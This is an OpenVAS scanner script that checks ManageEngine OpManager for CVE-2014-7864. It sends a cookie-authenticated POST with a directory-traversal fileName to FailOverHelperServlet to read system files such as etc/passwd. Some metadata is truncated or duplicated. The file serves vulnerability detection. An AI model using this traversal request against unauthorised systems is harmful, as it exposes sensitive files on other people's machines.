###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manage_engine_opmanager_mult_vuln_feb15.nasl 13755 2019-02-19 10:42:02Z jschulte $
#
# ZOHO ManageEngine OpManager Multiple Vulnerabilities - Feb15
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zohocorp:manageengine_opmanager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805473");
  script_version("$Revision: 13755 $");
  script_cve_id("CVE-2014-7864");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-19 11:42:02 +0100 (Tue, 19 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-03-20 11:53:55 +0530 (Fri, 20 Mar 2015)");
  script_name("ZOHO ManageEngine OpManager Multiple Vulnerabilities - Feb15");

  script_tag(name:"summary", value:"This host is installed with ZOHO ManageEngine
  OpManager and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Try to read a local file via a crafted HTTP POST request");

  script_tag(name:"insight", value:"The flaw is due to multiple SQL injection, Local file include and File overwrite
  vulnerabilities in the FailOverHelperServlet (aka FailServlet) servlet in ZOHO   ManageEngine OpManager.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  remote attackers and remote authenticated users to execute arbitrary SQL
  commands via the (1) customerName or (2) serverRole parameter in a
  standbyUpdateInCentral operation or to read/overwrite arbitrary files to
  servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet.");

  script_tag(name:"affected", value:"ZOHO ManageEngine OpManager
  versions  8 through 11.5 build 11400");

  script_tag(name:"solution", value:"Upgrade to version 11.6 or install the
  patch for v11.4 and 11.5  bilities-in-failoverhelperservlet");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130162");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/534575/100/0/threaded");
  script_xref(name:"URL", value:"https://support.zoho.com/portal/manageengine/helpcenter/articles/vulnerabilities-in-failoverhelperservle");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_manage_engine_opmanager_consolidation.nasl", "os_detection.nasl");
  script_mandatory_keys("manageengine/opmanager/http/detected");
  script_require_ports("Services/www", 8080);
  script_xref(name:"URL", value:"https://support.zoho.com/portal/manageengine/helpcenter/articles/vulnera");
  script_xref(name:"URL", value:"http://www.manageengine.com");
  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) )  exit(0);

url = '/';
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( "Set-Cookie" >!< buf )
{
  url = '/LoginPage.do';
  req = http_get( item:url, port:port );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
  if( "Set-Cookie" >!< buf )  exit( 0 );
}

co = eregmatch( pattern:'Set-Cookie: ([^\r\n]+)', string:buf );
if( isnull( co[1] ) ) exit( 0 );

cookie = co[1];

servlet = 'com.adventnet.me.opmanager.servlet.FailOverHelperServlet';
url = '/servlet/' + servlet;

req = http_get_req( port:port, url:url, add_headers:make_array( "Cookie", cookie ) );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "HTTP/1\.. 404" >< buf ) servlet = 'FailOverHelperServlet';

files = traversal_files();

foreach file ( keys( files ) )
{
  if( files[file] == 'etc/passwd' )
    traversal = '/../../../../../../../../../../../../../';
  else
    traversal = '\\..\\..\\..\\..\\..\\..\\..\\\\';

  url = '/servlet/' + servlet + '?operation=copyfile&fileName=' + traversal + files[file];

  req = http_post_req( port:port, url:url, data:NULL, add_headers: make_array( "Cookie", cookie ) );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( pattern:file, string:res ) )
  {
    report = 'By sending the request\n\n' + req + 'it was possible to read the file ' + files[file] + ' on the remote Host.\n\nResponse:\n\n' + res + '\n';
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );

